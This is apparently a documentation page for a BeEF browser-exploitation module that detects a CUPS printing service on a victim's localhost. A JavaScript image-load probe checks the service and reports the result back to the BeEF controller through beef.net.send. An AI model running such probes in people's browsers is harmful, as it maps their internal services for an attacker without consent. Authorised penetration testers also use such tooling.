## Summary

* **Objective**: Detect CUPS on localhost
* **Authors**: bcoles
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/host/detect_cups)

## Internal Working

This module attempts to detect Common UNIX Printing System (CUPS) on localhost on the default port 631.

Uses image tags:

```js
var result = "Not Installed";
var dom = document.createElement('b');
var img = new Image;
img.src = "http://<%= @ipHost %>:<%= @port %>/images/cups-icon.png";

img.onload = function() {
        if (this.width == 128 && this.height == 128) result="Installed";
        beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto=http&ip=<%= @ipHost %>&port=<%= @port %>&cups='+result, beef.are.status_success());
        dom.removeChild(this);
}

//...
dom.appendChild(img);

```

## Feedback

